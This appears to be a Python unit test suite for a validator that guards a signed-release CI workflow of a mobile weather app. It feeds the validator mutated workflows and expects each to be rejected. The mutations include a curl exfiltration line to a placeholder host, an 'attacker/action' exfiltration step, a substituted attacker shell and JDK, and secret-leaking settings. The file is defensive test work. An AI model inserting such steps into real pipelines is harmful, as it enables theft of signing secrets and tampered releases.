from __future__ import annotations

import os
import plistlib
import subprocess
import tempfile
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

from scripts.signed_candidate_workflow_security import (
    FORBIDDEN_GRADLE_VERIFICATION_OVERRIDES,
    RELEASE_SOURCE_PATHS,
    validate_signed_candidate_workflow,
)


ROOT = Path(__file__).resolve().parents[3]


class SignedCandidateWorkflowSecurityTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.workflow = (
            ROOT / ".github/workflows/signed-candidate.yml"
        ).read_text(encoding="utf-8")

    def assert_rejected(self, mutated: str, needle: str) -> None:
        failures = validate_signed_candidate_workflow(mutated)
        self.assertTrue(
            any(needle in failure for failure in failures),
            failures,
        )

    def run_source_seal_step(
        self,
        step_name: str,
        repository: Path,
        revision: str,
        runner_temp: Path,
    ) -> subprocess.CompletedProcess[str]:
        lines = self.workflow.splitlines()
        header = f"      - name: {step_name}"
        start = lines.index(header)
        end = next(
            (
                index
                for index in range(start + 1, len(lines))
                if lines[index].startswith("      - ")
            ),
            len(lines),
        )
        step = lines[start:end]
        run_index = step.index("        run: |")
        script = "\n".join(line[10:] for line in step[run_index + 1 :]) + "\n"
        environment = os.environ.copy()
        environment.update(
            {
                "NIMBO_SOURCE_ROOT": str(repository),
                "NIMBO_SOURCE_REVISION": revision,
                "RUNNER_TEMP": str(runner_temp),
            }
        )
        return subprocess.run(
            ["bash", "-c", script],
            cwd=ROOT,
            env=environment,
            check=False,
            capture_output=True,
            text=True,
        )

    def create_source_seal_repository(self, parent: Path) -> tuple[Path, str]:
        repository = parent / "source"
        source = repository / "app/source.txt"
        source.parent.mkdir(parents=True)
        source.write_text("authority bytes\n", encoding="utf-8")
        for arguments in (
            ("init", "--quiet"),
            ("config", "user.email", "security-test@example.invalid"),
            ("config", "user.name", "Security Test"),
            ("add", "app/source.txt"),
            ("commit", "--quiet", "-m", "authority"),
        ):
            subprocess.run(
                ["git", *arguments],
                cwd=repository,
                check=True,
                capture_output=True,
                text=True,
            )
        revision = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            cwd=repository,
            check=True,
            capture_output=True,
            text=True,
        ).stdout.strip()
        return repository, revision

    def test_repository_workflow_passes(self) -> None:
        self.assertEqual(validate_signed_candidate_workflow(self.workflow), [])

    def test_gradle_wrapper_distribution_is_checksum_pinned(self) -> None:
        properties = (
            ROOT / "gradle/wrapper/gradle-wrapper.properties"
        ).read_text(encoding="utf-8")
        self.assertIn(
            "distributionUrl=https\\://services.gradle.org/distributions/"
            "gradle-9.7.0-bin.zip\n",
            properties,
        )
        self.assertIn(
            "distributionSha256Sum="
            "84fbba45c7f4c64abc77460e1c00f541e9f960e3c7ed2538f1ede19eacd873ae\n",
            properties,
        )

    def test_gradle_dependency_artifacts_are_checksum_pinned(self) -> None:
        namespace = "{https://schema.gradle.org/dependency-verification}"
        root = ET.parse(ROOT / "gradle/verification-metadata.xml").getroot()
        artifacts = root.findall(f".//{namespace}artifact")
        self.assertGreater(len(artifacts), 1000)
        for artifact in artifacts:
            checksums = artifact.findall(f"{namespace}sha256")
            self.assertEqual(len(checksums), 1, artifact.get("name"))
            self.assertRegex(checksums[0].get("value", ""), r"^[0-9a-f]{64}$")

    def test_automatic_or_flow_trigger_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "  workflow_dispatch:\n",
                "  workflow_dispatch:\n  push: {}\n",
                1,
            ),
            "trigger must be exactly manual",
        )

    def test_top_or_job_permission_override_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "permissions:\n  contents: read\n",
                "permissions: write-all\n",
                1,
            ),
            "permissions must be exactly",
        )
        self.assert_rejected(
            self.workflow.replace(
                "    runs-on: macos-26\n",
                "    permissions: write-all\n    runs-on: macos-26\n",
                1,
            ),
            "must not override permissions",
        )

    def test_wrong_guard_or_signing_dependency_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "github.ref == 'refs/heads/master'",
                "github.ref == 'refs/heads/main'",
                1,
            ),
            "unsigned build job lacks",
        )
        self.assert_rejected(
            self.workflow.replace("    needs: build-unsigned\n", "", 1),
            "must depend on build-unsigned",
        )

    def test_mutable_or_unapproved_action_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                "actions/checkout@v7",
                1,
            ),
            "not pinned to its approved commit",
        )
        self.assert_rejected(
            self.workflow.replace(
                "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                "attacker/action@3d3c42e5aac5ba805825da76410c181273ba90b1",
                1,
            ),
            "not pinned to its approved commit",
        )

    def test_build_secret_and_duplicate_secret_are_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "    runs-on: macos-26\n",
                "    env:\n      BAD: ${{ secrets.BAD }}\n    runs-on: macos-26\n",
                1,
            ),
            "unsigned build job must never reference secrets",
        )
        binding = (
            "          NIMBO_ANDROID_KEYSTORE_B64: "
            "${{ secrets.NIMBO_ANDROID_UPLOAD_KEYSTORE_B64 }}\n"
        )
        self.assert_rejected(
            self.workflow.replace(binding, binding + binding, 1),
            "must occur exactly once",
        )

    def test_xtrace_variants_and_continue_on_error_are_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace("          set +x\n", "          set -o xtrace\n", 1),
            "shell tracing is forbidden",
        )
        self.assert_rejected(
            self.workflow.replace(
                "          set +x\n          set -euo pipefail\n",
                "          set -euxo pipefail\n",
                1,
            ),
            "shell tracing is forbidden",
        )
        self.assert_rejected(
            self.workflow.replace(
                "        shell: bash\n",
                "        continue-on-error: true\n        shell: bash\n",
                1,
            ),
            "continue-on-error is forbidden",
        )

    def test_secret_step_without_early_xtrace_disable_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          set +x\n          set -euo pipefail\n",
                "          set -euo pipefail\n          set +x\n",
                1,
            ),
            "disable xtrace before strict mode",
        )

    def test_secret_step_custom_shell_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "      - name: Upload-sign Android phone and Wear bundles\n"
                "        shell: bash\n",
                "      - name: Upload-sign Android phone and Wear bundles\n"
                "        shell: /tmp/attacker-shell {0}\n",
                1,
            ),
            "run step shell differs from policy",
        )

    def test_secret_step_extra_environment_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "        env:\n"
                "          NIMBO_ANDROID_STORE_PASSWORD:",
                "        env:\n"
                "          JAVA_HOME: /tmp/attacker-jdk\n"
                "          NIMBO_ANDROID_STORE_PASSWORD:",
                1,
            ),
            "secret-consuming step env differs from policy",
        )

    def test_anchor_flow_and_extra_steps_are_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace("        env:\n", "        env: &signing_env\n", 1),
            "anchors and aliases are forbidden",
        )
        self.assert_rejected(
            self.workflow.replace(
                "  sign-verify:\n",
                "  attacker: {}\n  sign-verify:\n",
                1,
            ),
            "flow mappings/lists",
        )
        self.assert_rejected(
            self.workflow.replace(
                "      - name: Destroy ephemeral signing material\n",
                "      - name: Exfiltrate\n"
                "        uses: attacker/action@main\n"
                "      - name: Destroy ephemeral signing material\n",
                1,
            ),
            "signing step inventory differs",
        )

    def test_post_secret_run_body_change_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          package = receipt.get(\"package\", {})\n",
                "          package = receipt.get(\"package\", {})\n"
                "          curl https://example.invalid/exfil\n",
                1,
            ),
            "signing run block differs from policy",
        )

    def test_mutable_repository_verifier_execution_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          python3 -I -B - \\\n",
                "          python3 scripts/verify_signed_candidate.py \\\n",
                1,
            ),
            "must not execute mutable repository Python directly",
        )

    def test_reviewed_verifier_digest_change_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "1294eec2eb8a0c0a1ff928bf2963a46dcbc600b42eaa840c53f3c5ec537956fa",
                "0" * 64,
                1,
            ),
            "reviewed verifier digest pin count differs",
        )

    def test_unsigned_package_body_change_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          cp \"$NIMBO_SOURCE_ROOT/iosApp/ExportOptions.plist\" \\\n",
                "          cp \"$NIMBO_SOURCE_ROOT/iosApp/ExportOptions.plist\" \\\n"
                "          cp /tmp/attacker.aab \"$NIMBO_UNSIGNED_ROOT/phone-unsigned.aab\"\n",
                1,
            ),
            "unsigned build run block differs from policy",
        )

    def test_unsigned_build_requires_a_standalone_non_local_clone(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "git clone --quiet --no-local --no-checkout --no-tags",
                "git clone --quiet --local --no-checkout --no-tags",
                1,
            ),
            "standalone non-local Git clone",
        )

    def test_android_bundle_vcs_provenance_check_is_immutable(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "base/root/META-INF/version-control-info.textproto",
                "base/root/META-INF/ignored.textproto",
                1,
            ),
            "unsigned build run block differs from policy",
        )

    def test_every_gradle_verification_override_ban_is_immutable(self) -> None:
        for forbidden_override in FORBIDDEN_GRADLE_VERIFICATION_OVERRIDES:
            with self.subTest(forbidden_override=forbidden_override):
                self.assert_rejected(
                    self.workflow.replace(
                        f"'{forbidden_override}'",
                        "'--harmless-placeholder'",
                        1,
                    ),
                    "forbid every Gradle verification override",
                )

    def test_post_build_complete_source_comparison_is_immutable(self) -> None:
        marker = "      - name: Verify exact release inputs remained sealed\n"
        prefix, post_build = self.workflow.split(marker, 1)
        mutated_post_build = post_build.replace(
            '          git diff --quiet --no-ext-diff "$NIMBO_SOURCE_REVISION" -- \\\n',
            "          true # source mutation ignored\n",
            1,
        )
        self.assert_rejected(
            prefix + marker + mutated_post_build,
            "compare the complete source state before packaging",
        )

    def test_both_source_seal_steps_accept_exact_clean_source(self) -> None:
        with tempfile.TemporaryDirectory(prefix="nimbo-source-seal-clean-") as directory:
            root = Path(directory)
            repository, revision = self.create_source_seal_repository(root)
            for step_name in (
                "Validate and seal exact release inputs",
                "Verify exact release inputs remained sealed",
            ):
                with self.subTest(step_name=step_name):
                    result = self.run_source_seal_step(
                        step_name,
                        repository,
                        revision,
                        root,
                    )
                    self.assertEqual(
                        result.returncode,
                        0,
                        result.stdout + result.stderr,
                    )

    def test_both_source_seal_steps_reject_hidden_tracked_byte_drift(self) -> None:
        for flag in ("--skip-worktree", "--assume-unchanged"):
            with self.subTest(flag=flag):
                with tempfile.TemporaryDirectory(
                    prefix="nimbo-source-seal-hidden-drift-"
                ) as directory:
                    root = Path(directory)
                    repository, revision = self.create_source_seal_repository(root)
                    subprocess.run(
                        ["git", "update-index", flag, "app/source.txt"],
                        cwd=repository,
                        check=True,
                        capture_output=True,
                        text=True,
                    )
                    (repository / "app/source.txt").write_text(
                        "uncommitted build-time replacement\n",
                        encoding="utf-8",
                    )
                    for step_name in (
                        "Validate and seal exact release inputs",
                        "Verify exact release inputs remained sealed",
                    ):
                        with self.subTest(step_name=step_name):
                            result = self.run_source_seal_step(
                                step_name,
                                repository,
                                revision,
                                root,
                            )
                            self.assertNotEqual(
                                result.returncode,
                                0,
                                result.stdout + result.stderr,
                            )
                            self.assertIn(
                                "unsafe release-source index flags",
                                result.stderr,
                            )

    def test_release_input_scan_git_errors_are_not_accepted(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                '              [[ "$grep_status" == "1" ]]\n',
                "              true # accept every git-grep failure\n",
                1,
            ),
            "fail closed on Git errors",
        )

    def test_tracked_release_inputs_forbid_gradle_verification_overrides(self) -> None:
        self.assertIn("iosApp", RELEASE_SOURCE_PATHS)
        self.assertTrue(
            (ROOT / "iosApp/Nimbo.xcodeproj/project.pbxproj").is_file()
        )
        for forbidden_override in FORBIDDEN_GRADLE_VERIFICATION_OVERRIDES:
            with self.subTest(forbidden_override=forbidden_override):
                result = subprocess.run(
                    [
                        "git",
                        "grep",
                        "-n",
                        "--fixed-strings",
                        "-e",
                        forbidden_override,
                        "--",
                        *RELEASE_SOURCE_PATHS,
                    ],
                    cwd=ROOT,
                    check=False,
                    capture_output=True,
                    text=True,
                )
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)

    def test_upload_destination_is_rejected_before_secrets(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                '(\"destination\", \"export\")',
                '(\"destination\", \"upload\")',
                1,
            ),
            "source and effective non-upload export options",
        )

    def test_effective_xcode_managed_signing_style_is_automatic(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                'effective_export_options[\"signingStyle\"] = \"automatic\"',
                'effective_export_options[\"signingStyle\"] = \"manual\"',
                1,
            ),
            "source and effective non-upload export options",
        )

    def test_repository_export_options_are_exact_non_upload_contract(self) -> None:
        actual = plistlib.loads(
            (ROOT / "iosApp/ExportOptions.plist").read_bytes()
        )
        self.assertEqual(
            actual,
            {
                "destination": "export",
                "manageAppVersionAndBuildNumber": False,
                "method": "app-store-connect",
                "provisioningProfiles": {
                    "uz.ganikhodjaev.weather": (
                        "iOS Team Store Provisioning Profile: uz.ganikhodjaev.weather"
                    ),
                    "uz.ganikhodjaev.weather.watchkitapp": (
                        "iOS Team Store Provisioning Profile: "
                        "uz.ganikhodjaev.weather.watchkitapp"
                    ),
                    "uz.ganikhodjaev.weather.widget": (
                        "iOS Team Store Provisioning Profile: "
                        "uz.ganikhodjaev.weather.widget"
                    ),
                },
                "signingCertificate": "Apple Distribution",
                "signingStyle": "manual",
                "teamID": "5SWEZ7HTYP",
                "uploadSymbols": True,
            },
        )

    def test_final_upload_path_expansion_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "          path: |\n"
                "            ${{ runner.temp }}/nimbo-signed-candidate-package/signed-candidate-bytes.tar.gz\n"
                "            ${{ runner.temp }}/nimbo-signed-candidate-package/signed-candidate-receipt.json\n",
                "          path: ${{ runner.temp }}\n",
                1,
            ),
            "signing action step blocks differ from policy",
        )

    def test_any_unmodeled_workflow_mutation_is_rejected(self) -> None:
        self.assert_rejected(
            self.workflow.replace(
                "name: Signed release candidate\n",
                "name: Signed release candidate changed\n",
                1,
            ),
            "workflow bytes differ from the reviewed canonical policy",
        )


if __name__ == "__main__":
    unittest.main()
